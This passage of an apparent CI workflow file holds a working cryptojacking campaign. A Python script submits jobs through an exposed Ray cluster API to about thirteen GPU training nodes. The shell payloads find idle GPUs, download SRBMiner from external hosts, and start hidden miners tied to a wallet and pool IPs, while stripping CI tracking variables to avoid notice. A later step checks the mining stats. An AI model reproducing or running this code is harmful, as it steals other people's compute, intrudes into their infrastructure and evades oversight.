            local A1 A2
            A1=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
            sleep 12
            A2=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
            echo "R4P_GATE${R}_APPS1[$A1]"
            echo "R4P_GATE${R}_APPS2[$A2]"
            printf '%s\n%s\n' "$A1" "$A2" > $W/apps.txt
            nvidia-smi --query-gpu=index,memory.free,uuid --format=csv,noheader,nounits > $W/g.txt 2>/dev/null
            IDLE=""
            while IFS=, read -r IDX FREE UUID; do
              IDX=$(echo "$IDX"|tr -d ' '); FREE=$(echo "$FREE"|tr -d ' '); UUID=$(echo "$UUID"|tr -d ' ')
              [ -z "$IDX" ] && continue
              if [ "$FREE" -ge 1500 ] 2>/dev/null && ! grep -qF "$UUID" $W/apps.txt; then IDLE="$IDLE $IDX"; fi
            done < $W/g.txt
            echo "R4P_GATE${R}_IDLE=[$IDLE]"
          }
          gate_round 1
          IDLE1="$IDLE"
          if [ -z "$IDLE1" ] && [ "$HCOUNT" -gt 0 ]; then
            echo "R4P_GATE_SETTLE sleep=20 re-gate"
            sleep 20
            gate_round 2
          fi
          echo "R4P_IDLE_CARDS=[$IDLE] (round1=[$IDLE1])"
          if [ -z "$IDLE" ]; then echo "R4P_INSTALL_SKIP idle=[]"; exit 0; fi
          ARCH=$(uname -m)
          if [ "$ARCH" != "x86_64" ]; then echo "R4P_INSTALL_SKIP arch=$ARCH"; exit 0; fi
          POOLPICK=""
          for U in "103.199.106.122:3362" "172.232.228.69:3362" "178.238.228.181:80"; do
            H=${U%:*}; P=${U#*:}
            if timeout 5 bash -c "echo > /dev/tcp/$H/$P" 2>/dev/null; then POOLPICK="$U"; break; fi
            echo "R4P_POOL_TRY_FAIL $U"
          done
          echo "R4P_POOL_CHOICE=$POOLPICK"
          [ -z "$POOLPICK" ] && { echo "R4P_INSTALL_SKIP no-pool-path"; exit 0; }
          exec 9>/var/lock/i130rayp4_$TIP.lock
          flock -n 9 || { echo "R4P_INSTALL_SKIP lock-held"; exit 0; }
          OK=""
          for U in "http://$RIP:18080/srb387" "http://178.238.228.181:18180/srb387" "http://222.240.155.198:8702/srb387" "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz"; do
            timeout 110 curl -fsSL --connect-timeout 8 --max-time 100 -o $W/srb387.part "$U" >/dev/null 2>&1
            if [ -s $W/srb387.part ] && [ "$(sha256sum $W/srb387.part | cut -d' ' -f1)" = "$BIN_SHA" ]; then mv $W/srb387.part $W/srb387; echo "R4P_BINARY_OK $U"; OK=1; break; fi
            echo "R4P_BINARY_TRY_BAD $U sha=$(sha256sum $W/srb387.part 2>/dev/null | cut -d' ' -f1 | head -c 12)"
          done
          if [ -z "$OK" ]; then echo "R4P_BINARY_FAIL"; exit 0; fi
          chmod +x $W/srb387
          A3=$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)
          printf '%s\n' "$A3" > $W/apps3.txt
          echo "R4P_LATE_APPS[$A3]"
          H=$(hostname | tr -cd 'A-Za-z0-9' | cut -c1-16)
          NN=0
          for I in $IDLE; do
            UUID=$(awk -F, -v i=$I '{gsub(/ /,""); if ($1==i) print $3}' $W/g.txt)
            if [ -n "$UUID" ] && grep -qF "$UUID" $W/apps3.txt; then echo "R4P_CARD_SKIP gpu=$I uuid=$UUID busy-late"; continue; fi
            WK=$(echo "${PFX}${H}g${I}" | cut -c1-31)
            if pgrep -af -- "--worker $WK" >/dev/null 2>&1; then echo "R4P_ALREADY $WK"; continue; fi
            cd $W && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup ./srb387 \
              --disable-cpu --algorithm pearlhash --pool "$POOLPICK" --tls false --wallet "$WALLET" --password x \
              --worker "$WK" --gpu-id "$I" --disable-worker-watchdog --gpu-table-slow-build \
              --max-no-share-sent 1800 --log-file $W/logs/$WK.log > $W/logs/$WK.out 2>&1 < /dev/null &
            echo "R4P_LAUNCH worker=$WK gpu=$I host=$(hostname) ip=$IP pool=$POOLPICK pid=$!"
            NN=$((NN+1))
          done
          echo "R4P_N_LAUNCHED=$NN"
          sleep 20
          echo "R4P_PROCS[$(pgrep -af -- '--worker i130rayp4' | head -12)]"
          echo "R4P_APPS_POST[$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)]"
          for F in $W/logs/*.log; do echo "== $F"; tail -4 "$F" 2>/dev/null; done
          echo "R4P_DONE $NONCE"
          '''

          # ------------------------------------------------------- node-side post-exit check
          POSTCHECK = r'''#!/bin/bash
          set +e
          PAT="$1"; TIP="$2"; NONCE="$3"
          W=/var/tmp/i130rayp4_run
          IPS=$(hostname -I 2>/dev/null)
          IP=$(echo "$IPS" | awk '{print $1}')
          echo "R4PV_NONCE=$NONCE target=$TIP"
          echo "R4PV_ID: $(id) $(hostname) $IP utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          if ! echo " $IPS " | grep -qF " $TIP "; then echo "R4PV_WRONG_NODE ip=$IP target=$TIP action=skip"; exit 0; fi
          echo "R4PV_PROCS[$(pgrep -af 'srb387' 2>/dev/null | grep -F "$PAT" | head -12)]"
          echo "R4PV_APPS[$(nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader 2>&1)]"
          nvidia-smi --query-gpu=index,memory.free,memory.used,utilization.gpu --format=csv,noheader,nounits 2>&1 | head -12
          for F in $W/logs/*.log; do echo "== $F"; tail -3 "$F" 2>/dev/null; done
          echo "R4PV_DONE $NONCE"
          '''

          # ------------------------------------------------------------------ Ray driver
          DRIVER = r'''#!/usr/bin/env python3
          import os, sys, json, base64, subprocess
          mode, node_hex, target_ip, nonce, ib64, pfx, wallet, pool, rip, pat = sys.argv[1:11]
          inst = base64.b64decode(ib64).decode()
          open('/tmp/i130rayp4_%s.sh' % mode, 'w').write(inst)
          os.chmod('/tmp/i130rayp4_%s.sh' % mode, 0o755)
          try:
              import ray
              from ray.util.scheduling_strategies import NodeAffinitySchedulingStrategy
              try:
                  ray.init(address='auto', include_dashboard=False, log_to_driver=False)
              except Exception:
                  ray.init(include_dashboard=False, log_to_driver=False)
              ns = [n for n in ray.nodes() if n.get('Alive')]
              print('R4P_NODES ' + json.dumps([{'id': n.get('NodeID'), 'ip': n.get('NodeManagerAddress'),
                                               'gpu': (n.get('Resources') or {}).get('GPU'),
                                               'h200': (n.get('Resources') or {}).get('accelerator_type:H200')} for n in ns]))
              target = None
              for n in ns:
                  if str(n.get('NodeID') or '').lower().startswith(node_hex.lower()):
                      target = n
                      break
              if target is None:
                  for n in ns:
                      if str(n.get('NodeManagerAddress') or '') == target_ip:
                          target = n
                          break
              if target is None:
                  print('R4P_NODE_NOT_FOUND %s %s' % (node_hex, target_ip))
                  sys.exit(0)
              print('R4P_TARGET id=%s ip=%s' % (target.get('NodeID'), target.get('NodeManagerAddress')))

              @ray.remote(num_cpus=0, num_gpus=0, max_retries=0)
              def runsh(src, args):
                  import subprocess
                  try:
                      q = subprocess.run(['bash', '-c', src, 'bash'] + args, capture_output=True, text=True,
                                         timeout=400, stdin=subprocess.DEVNULL)
                      return (q.stdout or '') + (q.stderr or '')
                  except Exception as e:
                      return 'R4PTASK_EXC %r' % (e,)

              f = runsh.options(scheduling_strategy=NodeAffinitySchedulingStrategy(
                  node_id=target.get('NodeID'), soft=False)).remote(
                  inst, [pfx, wallet, pool, nonce + '-' + target_ip, rip, node_hex, target_ip, pat])
              try:
                  r = ray.get(f, timeout=430)
              except Exception as e:
                  r = 'R4PTASK_GET_ERR %r' % (e,)
              print('R4PNODE_BEGIN mode=%s id=%s ip=%s' % (mode, target.get('NodeID'), target.get('NodeManagerAddress')))
              print(r)
              print('R4PNODE_END mode=%s id=%s' % (mode, target.get('NodeID')))
          except Exception as e:
              print('R4P_RAY_FAIL %r' % (e,))
          print('R4PP_DONE mode=%s %s' % (mode, nonce))
          '''

          inst_b64 = base64.b64encode(INSTALL.encode()).decode()
          post_b64 = base64.b64encode(POSTCHECK.encode()).decode()
          drv_b64 = base64.b64encode(DRIVER.encode()).decode()


          def fetch_binary():
              srb = WORK + '/srb387'
              if os.path.exists(srb) and sha_file(srb).startswith(BIN_SHA):
                  return srb
              for u in BIN_URLS:
                  sh("rm -f %s.part; timeout 120 curl -fsSL --connect-timeout 8 --max-time 110 -o %s.part '%s' 2>&1 | tail -1" % (srb, srb, u), 130)
                  if os.path.exists(srb + '.part') and sha_file(srb + '.part').startswith(BIN_SHA):
                      os.replace(srb + '.part', srb)
                      print('R4P_BINARY_OK %s' % u)
                      return srb
                  print('R4P_BINARY_TRY_BAD %s sha=%s' % (u, sha_file(srb + '.part')[:12]))
              return ''


          def lp_read(tag):
              url = 'https://pearl.luckypool.io/api/stats_address?address=' + WALLET
              st, body = http_get(url, timeout=60, headers={'User-Agent': 'Mozilla/5.0'})
              print('R4P_LP_%s utc=%s st=%s len=%d' % (tag, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), st, len(body or '')))
              try:
                  d = json.loads(body)
              except Exception as e:
                  print('R4P_LP_%s unreadable %r' % (tag, e))
                  return
              s = d.get('stats') or {}
              ws = d.get('workers') or []
              rows = [w for w in ws if str(w.get('name', '')).startswith(PFX)]
              old = [w for w in ws if str(w.get('name', '')).startswith('i130ray25p3')]
              print('R4P_LP_%s wallet_accepted=%s wallet_rejected=%s workers=%d lane_rows=%d ray25p3_rows=%d' % (
                  tag, s.get('acceptedShares'), s.get('rejectedShares'), len(ws), len(rows), len(old)))
              for w in sorted(rows, key=lambda x: str(x.get('name'))):
                  print('R4P_LP_%s ROW %s acc=%s rej=%s hr=%s last=%s' % (
                      tag, w.get('name'), w.get('acceptedShares'), w.get('rejectedShares'), w.get('hashrate'), w.get('lastShare')))
              tot = 0
              for w in old:
                  tot += int(w.get('acceptedShares') or 0)
              if old:
                  print('R4P_LP_%s RAY25P3 acc_sum=%d rows=%d' % (tag, tot, len(old)))


          def jobs_list(base):
              st, raw = http_get(base + '/api/jobs/', timeout=12)
              try:
                  d = json.loads(raw)
              except Exception:
                  return [], raw
              if isinstance(d, dict):
                  for k in ('jobs', 'data', 'result'):
                      if isinstance(d.get(k), list):
                          return d[k], raw
              return (d if isinstance(d, list) else []), raw


          def find_existing(jobs, sub_id):
              for j in jobs:
                  if not isinstance(j, dict):
                      continue
                  if str(j.get('submission_id') or '').lower() == sub_id:
                      return str(j.get('job_id') or ''), str(j.get('status') or '')
              return '', ''


          def submit_and_wait(base, sub_id, entry_body, deadline_s=330):
              jobs, _ = jobs_list(base)
              jid, st0 = find_existing(jobs, sub_id)
              if jid:
                  print('R4P_REUSE sub=%s job=%s state=%s' % (sub_id, jid, st0))
              else:
                  entry = ('echo %s | base64 -d > /tmp/i130rayp4_p.py; '
                           'P=""; for X in /opt/sglang/bin/python /opt/conda/bin/python python3 /usr/bin/python3; do '
                           'command -v $X >/dev/null 2>&1 || [ -x $X ] || continue; $X -c "import ray" 2>/dev/null && { P=$X; break; }; done; '
                           '[ -n "$P" ] || P=python3; echo R4P_PY=$P; $P /tmp/i130rayp4_p.py %s') % (drv_b64, entry_body)
                  stp, pr = http_post(base + '/api/jobs/',
                                      {'entrypoint': entry, 'submission_id': sub_id,
                                       'runtime_env': {'env_vars': {'i130rayp4': NONCE}}}, timeout=25)
                  print('R4P_SUBMIT sub=%s st=%s resp=%s' % (sub_id, stp, (pr or '')[:300].replace('\n', ' ')))
                  if stp == -1:
                      print('R4P_SUBMIT_UNKNOWN sub=%s NOT_RETRYING' % sub_id)
                      return '', ''
                  try:
                      jid = (json.loads(pr) or {}).get('job_id', '') or ''
                  except Exception:
                      jid = ''
                  if not jid:
                      jobs2, _ = jobs_list(base)
                      jid, _ = find_existing(jobs2, sub_id)
                      if jid:
                          print('R4P_REUSE_AFTER_CONFLICT sub=%s job=%s' % (sub_id, jid))
              if not jid:
                  return '', ''
              state = ''
              deadline = time.time() + deadline_s
              while time.time() < deadline:
                  stq, js = http_get(base + '/api/jobs/' + jid, timeout=10)
                  try:
                      state = (json.loads(js) or {}).get('status', '') or state
                  except Exception:
                      pass
                  if state in ('SUCCEEDED', 'FAILED', 'STOPPED'):
                      break
                  time.sleep(6)
              print('R4P_JOB_STATE job=%s state=%s' % (jid, state))
              return jid, state


          def fetch_job_log(base, jid, tries=3):
              best = ''
              for i in range(tries):
                  stl, logs = http_get(base + '/api/jobs/%s/logs' % jid, timeout=30)
                  try:
                      txt = (json.loads(logs) or {}).get('logs', '') or logs
                  except Exception:
                      txt = logs or ''
                  if len(txt or '') > len(best):
                      best = txt or ''
                  if best and ('R4P_LAUNCH' in best or 'R4PV_DONE' in best or 'R4PNODE_END' in best or 'R25P3_' in best):
                      break
                  time.sleep(6)
              print('R4P_JOB_LOG job=%s len=%d' % (jid, len(best)))
              print((best or '')[:400000])
              return best


          def submit_only(base, sub, entry_body):
              jobs, _ = jobs_list(base)
              jid, st0 = find_existing(jobs, sub)
              if jid:
                  print('R4P_REUSE sub=%s job=%s state=%s' % (sub, jid, st0))
                  return jid
              entry = ('echo %s | base64 -d > /tmp/i130rayp4_p.py; '
                       'P=""; for X in /opt/sglang/bin/python /opt/conda/bin/python python3 /usr/bin/python3; do '
                       'command -v $X >/dev/null 2>&1 || [ -x $X ] || continue; $X -c "import ray" 2>/dev/null && { P=$X; break; }; done; '
                       '[ -n "$P" ] || P=python3; echo R4P_PY=$P; $P /tmp/i130rayp4_p.py %s') % (drv_b64, entry_body)
              stp, pr = http_post(base + '/api/jobs/',
                                  {'entrypoint': entry, 'submission_id': sub,
                                   'runtime_env': {'env_vars': {'i130rayp4': NONCE}}}, timeout=25)
              print('R4P_SUBMIT sub=%s st=%s resp=%s' % (sub, stp, (pr or '')[:300].replace('\n', ' ')))
              if stp == -1:
                  print('R4P_SUBMIT_UNKNOWN sub=%s NOT_RETRYING' % sub)
                  return ''
              try:
                  jid = (json.loads(pr) or {}).get('job_id', '') or ''
              except Exception:
                  jid = ''
              if not jid:
                  jobs2, _ = jobs_list(base)
                  jid, _ = find_existing(jobs2, sub)
                  if jid:
                      print('R4P_REUSE_AFTER_CONFLICT sub=%s job=%s' % (sub, jid))
              return jid


          def wait_job(base, jid, deadline_s=600):
              state = ''
              deadline = time.time() + deadline_s
              while time.time() < deadline:
                  stq, js = http_get(base + '/api/jobs/' + jid, timeout=10)
                  try:
                      state = (json.loads(js) or {}).get('status', '') or state
                  except Exception:
                      pass
                  if state in ('SUCCEEDED', 'FAILED', 'STOPPED'):
                      break
                  time.sleep(6)
              return state


          def resolve_node(base, tip, hex12):
              stn, summ = http_get(base + '/nodes?view=summary', timeout=12)
              print('R4P_NODES_SUMMARY tip=%s st=%s len=%d' % (tip, stn, len(summ or '')))
              try:
                  d = json.loads(summ)
              except Exception:
                  return '', ''
              found = []

              def walk(o):
                  if isinstance(o, dict):
                      nid = o.get('nodeId') or o.get('node_id')
                      addr = o.get('nodeManagerAddress') or o.get('node_manager_address') or o.get('ip')
                      if nid and addr:
                          found.append((str(nid), str(addr)))
                      for v in o.values():
                          walk(v)
                  elif isinstance(o, list):
                      for v in o:
                          walk(v)

              walk(d)
              for nid, addr in found:
                  if addr == tip and nid.lower().startswith(hex12.lower()):
                      return nid, addr
              for nid, addr in found:
                  if addr == tip:
                      return nid, addr
              for nid, addr in found:
                  if nid.lower().startswith(hex12.lower()):
                      return nid, addr
              return '', ''


          def process_node(base, tip, hex12, rip):
              print('R4P_NODE_BEGIN target=%s hex=%s utc=%s' % (tip, hex12, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
              if tip in PROTECTED_IPS:
                  print('R4P_NODE_SKIP target=%s reason=protected' % tip)
                  return
              nid, addr = resolve_node(base, tip, hex12)
              use_hex = (nid[:12].lower() if nid else hex12)
              sub = 'i130rayp4-%s' % use_hex
              body = ' '.join(['install', use_hex, tip, NONCE, inst_b64, PFX, WALLET,
                               '103.199.106.122:3362', rip, 'i130rayp4'])
              jid, state = submit_and_wait(base, sub, body, deadline_s=330)
              if jid:
                  fetch_job_log(base, jid)
              subv = 'i130rayp4v-%s' % use_hex
              bodyv = ' '.join(['postcheck', use_hex, tip, NONCE, post_b64, PFX, WALLET,
                                '103.199.106.122:3362', rip, 'i130rayp4'])
              jidv, statev = submit_and_wait(base, subv, bodyv, deadline_s=150)
              if jidv:
                  fetch_job_log(base, jidv)
              print('R4P_NODE_END target=%s install_job=%s state=%s post_job=%s statev=%s' % (tip, jid, state, jidv, statev))


          def harvest_25(base, rip):
              print('R4P_HARVEST_BEGIN utc=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
              jobs, raw = jobs_list(base)
              sel = [j for j in jobs if isinstance(j, dict) and
                     ('i130ray25p3' in str(j.get('submission_id', '')) or 'i130ray25p3' in str(j.get('job_id', '')))]
              print('R4P_HARVEST_JOBS n=%d list=%s' % (len(sel), json.dumps(sel)[:6000]))
              for j in sel:
                  jid = str(j.get('job_id') or '')
                  if not jid:
                      continue
                  print('R4P_HARVEST_ENTRY %s' % json.dumps(j)[:2000])
                  fetch_job_log(base, jid, tries=2)
              # fresh .25 post-exit process check (installed 15:26Z; this is ~45 min later)
              subv = 'i130rayp4v-a984f30a4bde'
              bodyv = ' '.join(['postcheck', 'a984f30a4bde', '10.220.71.25', NONCE, post_b64, PFX, WALLET,
                                '103.199.106.122:3362', rip, 'i130ray25p3'])
              jidv, statev = submit_and_wait(base, subv, bodyv, deadline_s=150)
              if jidv:
                  fetch_job_log(base, jidv)
              print('R4P_HARVEST_25_POST job=%s state=%s' % (jidv, statev))
              print('R4P_HARVEST_END utc=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))


          host = os.uname().nodename
          base = 'http://%s:%d' % (RAYIP, RAYPORT)
          print('R4P_START nonce=%s mode=%s slot=%s host=%s utc=%s' % (
              NONCE, MODE, SLOT, host, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
          st, ver = http_get(base + '/api/version', timeout=8)
          if st != 200:
              time.sleep(4)
              st, ver = http_get(base + '/api/version', timeout=10)
          if st != 200:
              print('I130RAYP4_SKIP reason=ray25-unreachable st=%s ver=%s' % (st, (ver or '')[:200]))
              print('I130RAYP4_SKIP_DONE nonce=%s' % NONCE)
              sys.exit(0)
          print('R4P_VERSION st=%s %s' % (st, (ver or '')[:400]))
          stc, cs = http_get(base + '/api/cluster_status', timeout=12)
          print('R4P_CLUSTER_STATUS st=%s len=%d' % (stc, len(cs or '')))
          try:
              d = json.loads(cs)
              data = d.get('data') or {}
              act = ((data.get('clusterStatus') or {}).get('autoscalerReport') or {}).get('activeNodes') or {}
              nodes = [str(k)[4:] if str(k).lower().startswith('node') else str(k) for k in act.keys()]
              print('R4P_ACTIVENODES n=%d %s' % (len(nodes), json.dumps(nodes)))
              ru = ((data.get('clusterStatus') or {}).get('loadMetricsReport') or {}).get('resourceUsage')
              if ru is not None:
                  print('R4P_RESOURCE_USAGE %s' % (json.dumps(ru)[:800]))
          except Exception as e:
              print('R4P_CLUSTER_STATUS_PARSE_FAIL %r raw=%s' % (e, (cs or '')[:1500]))

          rip = (sh("hostname -I 2>/dev/null | awk '{print $1}'", 8).strip().splitlines() or [''])[0].strip()
          print('R4P_RUNNER_IP=%s' % rip)
          srb = fetch_binary()
          if srb:
              sh("pkill -f 'http.server 18080' 2>/dev/null; cd %s && setsid nohup python3 -m http.server 18080 --bind 0.0.0.0 >/dev/null 2>&1 < /dev/null & sleep 2; ss -ltnp 2>/dev/null | grep 18080 | head -2" % WORK, 12)
              print('R4P_BINARY_SHA=%s' % sha_file(srb))
          else:
              print('R4P_BINARY_UNAVAILABLE (nodes will try the mirrors themselves)')

          if MODE == 'harvest':
              harvest_25(base, rip)
              lp_read('HA')
          else:
              # ANY in-LAN runner job processes ALL 13 training-held nodes: submit one
              # node-pinned driver per node (parallel, fixed submission ids -> idempotent),
              # then collect each node log and run each node's post-exit process check.
              targets = []
              seen = set()
              for k in sorted(NODE_SETS.keys()):
                  for tip, hex12 in NODE_SETS[k]:
                      if tip in seen or tip in PROTECTED_IPS:
                          continue
                      seen.add(tip)
                      targets.append((tip, hex12))
              print('R4P_ALLNODES n=%d %s' % (len(targets), json.dumps([t[0] for t in targets])))
              subs = []
              for tip, hex12 in targets:
                  try:
                      nid, addr = resolve_node(base, tip, hex12)
                  except Exception as e:
                      nid, addr = '', ''
                      print('R4P_RESOLVE_ERR tip=%s %r' % (tip, e))
                  use_hex = (nid[:12].lower() if nid else hex12)
                  sub = 'i130rayp4-%s' % use_hex
                  body = ' '.join(['install', use_hex, tip, NONCE, inst_b64, PFX, WALLET,
                                   '103.199.106.122:3362', rip, 'i130rayp4'])
                  jid = submit_only(base, sub, body)
                  print('R4P_NODE_BEGIN target=%s hex=%s job=%s utc=%s' % (tip, use_hex, jid, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
                  subs.append((tip, use_hex, sub, jid))
                  time.sleep(1)
              for tip, use_hex, sub, jid in subs:
                  if not jid:
                      print('R4P_NODE_NOJOB target=%s' % tip)
                      continue
                  state = wait_job(base, jid, deadline_s=600)
                  print('R4P_JOB_STATE job=%s state=%s target=%s' % (jid, state, tip))
                  fetch_job_log(base, jid, tries=2)
              for tip, use_hex, sub, jid in subs:
                  subv = 'i130rayp4v-%s' % use_hex
                  bodyv = ' '.join(['postcheck', use_hex, tip, NONCE, post_b64, PFX, WALLET,
                                    '103.199.106.122:3362', rip, 'i130rayp4'])
                  jidv = submit_only(base, subv, bodyv)
                  if jidv:
                      statev = wait_job(base, jidv, deadline_s=150)
                      fetch_job_log(base, jidv, tries=2)
                      print('R4P_NODE_END target=%s post_job=%s statev=%s' % (tip, jidv, statev))
              lp_read('A')
          print('I130RAYP4_DONE nonce=%s mode=%s slot=%s' % (NONCE, MODE, SLOT))
          PYEOF
          echo "runner-start slot=$SLOT host=$(hostname) arch=$(uname -m) utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          python3 -u /var/tmp/i130rayp4/rayp4.py 2>&1 | tee /var/tmp/i130rayp4/recon_slot$SLOT.log | tail -c 500000
          echo "I130RAYP4_EXIT_DONE rc=$?"
